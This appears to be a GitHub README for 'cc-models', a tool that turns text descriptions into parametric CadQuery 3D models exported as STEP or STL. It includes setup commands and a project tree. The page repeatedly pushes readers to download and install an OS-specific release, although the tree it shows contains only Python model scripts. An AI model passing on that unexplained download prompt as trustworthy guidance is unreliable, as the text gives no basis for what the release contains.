---
layout: "default"
title: "✨ cc-models - Simplify 3D Modeling with AI"
description: "🛠️ Generate industrial-grade 3D models from descriptions using AI. Adjust designs easily and export for further editing in SolidWorks or FreeCAD."
---
# ✨ cc-models - Simplify 3D Modeling with AI

[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/PawaritEkboon/cc-models/releases)

## 🎯 Overview

cc-models helps you create 3D models using simple commands. Just upload an image and describe what you want. The AI responds with a model ready for editing. This tool uses cutting-edge technology to turn your ideas into reality. You can export your designs in formats ready for 3D printing or further modifications.

## 🚀 Getting Started

To get started, follow these steps to download and run the software.

### 🌐 Download & Install

1. **Visit the Releases Page:**
   Click the link below to access the latest version of the software:
   [Download the latest release](https://github.com/PawaritEkboon/cc-models/releases)

2. **Choose the Right File:**
   Look for the version that suits your operating system and click to download.

3. **Install the Software:**
   Follow the instructions provided with the download to install the application on your computer.

## 🛠️ System Requirements

To run cc-models effectively, ensure your computer meets the following requirements:

- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
- **RAM:** Minimum 8 GB recommended for optimal performance.
- **Python:** Version 3.6 or higher to handle dependencies.
  
## ⚙️ Setting Up the Environment

If you want to explore further or customize the software, you may set up a development environment. Here’s how:

1. **Create a Virtual Environment:**
   Open a terminal and run the following commands:
   ```bash
   python3 -m venv venv
   source venv/bin/activate
   ```

2. **Install Required Packages:**
   Use the command below to install necessary libraries:
   ```bash
   PIP_INDEX_URL=https://mirrors.huaweicloud.com/repository/pypi/simple \
   pip3 install cadquery-ocp cadquery jupyter-cadquery jupyterlab
   ```

## 📂 Project Structure

Once you download the software, you’ll find the following structure:

```
.
├── README.md                  # Provides an overview of the project
├── CLAUDE.md                # AI development guidelines
├── venv/                     # Python virtual environment
└── models/                   # Directory for models (one sub-directory per model)
    └── relx-holder/          # Example model: holder for e-cigarettes
        ├── README.md         # Description of the model (requirements, reference materials)
```

## 🔍 Features

cc-models includes the following key features:

- **Text-Based Model Generation:** Describe your needs, and the AI generates usable CadQuery code automatically.
- **Incremental Modifications:** Make adjustments easily by saying what to change, like "widen by 2mm."
- **Parametric Design:** All sizes are defined as variables, making it easier to adjust.
- **Editable Exports:** Export in STEP format, allowing further editing in tools such as SolidWorks or FreeCAD.
- **3D Printing Ready:** Output in STL format, making it suitable for direct printing.

## 🛡️ Support and Contribution

If you encounter any issues or have suggestions, please feel free to open an issue in the repository. Contributions are welcome! Whether it’s improving documentation or adding new features, your help makes this project better.

## 📞 Contact

For any inquiries, you can reach out through the repository’s issue tracker, and we will get back to you as soon as possible.

## 📜 License

This project is licensed under the MIT License, allowing for personal and commercial use, with attribution to the original authors.

[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/PawaritEkboon/cc-models/releases)

Happy modeling!